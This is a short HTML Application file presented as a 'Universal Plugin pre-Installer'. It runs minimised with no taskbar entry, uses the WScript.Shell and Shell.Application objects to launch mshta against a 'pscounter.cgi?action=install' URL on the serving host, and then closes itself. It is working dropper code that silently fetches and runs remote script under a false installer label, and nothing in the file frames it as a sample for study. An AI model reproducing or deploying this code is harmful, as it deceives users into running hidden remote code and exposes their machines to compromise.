<HTML><HEAD><TITLE>Universal Plugin pre-Installer</TITLE>
<HTA:APPLICATION id=PlugInst
APPLICATIONNAME="Plugin pre-Installer"
SHOWINTASKBAR=NO
CAPTION=YES
SINGLEINSTANCE=YES
MAXIMIZEBUTTON=NO
MINIMIZEBUTTON=NO
WINDOWSTATE=MINIMIZE
/></HEAD>
<OBJECT id="MSplay" classid="clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B"></OBJECT>
<BODY>
<SCRIPT language="VBScript">
EP=document.location.href 
j=InStrRev(EP,"/",-1,1)
EP=Left(EP,j)
If InStr(EP,"cgi-bin")<>0 Then
CGIP=EP & "pscounter.cgi"    
Else
CGIP=EP & "cgi-bin/gen/pscounter.cgi"    
End If   
IP= CGIP & "?action=install"  
Set oSA = CreateObject("Shell.Application")
On Error Resume Next
oSA.ShellExecute "mshta",IP
If Err.number <> 0 Then
Cmd="mshta " & IP
MSplay.Run (Cmd),1,FALSE         
End If
self.Close
</SCRIPT>
</BODY></HTML>

